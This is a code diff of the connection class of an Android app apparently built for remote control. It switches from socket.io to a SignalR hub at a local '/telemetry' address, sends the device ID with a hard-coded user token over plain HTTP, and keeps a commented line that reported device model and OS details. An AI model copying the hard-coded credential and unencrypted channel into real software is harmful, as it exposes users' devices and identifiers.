@@ -1,18 +1,14 @@
-package com.remote.app;
+package com.remote.app.socket;
 
-import android.os.Build;
 import android.provider.Settings;
 
 import com.microsoft.signalr.HubConnection;
 import com.microsoft.signalr.HubConnectionBuilder;
+import com.microsoft.signalr.HubConnectionState;
+import com.remote.app.MainService;
 
-import java.net.URISyntaxException;
-import java.util.Dictionary;
 import java.util.HashMap;
 import java.util.Map;
-
-import io.socket.client.IO;
-import io.socket.client.Socket;
 
 public class IOSocket {
     private static final IOSocket ourInstance = new IOSocket();
@@ -25,13 +21,11 @@ public class IOSocket {
 
             Map<String, String> headers = new HashMap<String, String>();
             headers.put("device-id", deviceID);
-            headers.put("user-token", "");
+            headers.put("user-token", "ba53922b-64ee-424c-bdc5-19c9ee82c1af");
 
-            HubConnection hubConnection = HubConnectionBuilder.create("https://192.168.0.6:5001")
+            ioSocket = HubConnectionBuilder.create("http://192.168.1.5:5000/telemetry")
                     .withHeaders(headers)
                     .build();
-
-            ioSocket = hubConnection;
 
             //ioSocket = IO.socket("http://192.168.0.6:80?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
         } catch (Exception e) {
@@ -46,6 +40,11 @@ public class IOSocket {
 
     public HubConnection getIoSocket() {
         return ioSocket;
+    }
+
+    public void send(String method, Object... args) {
+        if (ioSocket.getConnectionState() == HubConnectionState.CONNECTED)
+            ioSocket.send(method, args);
     }
 
 
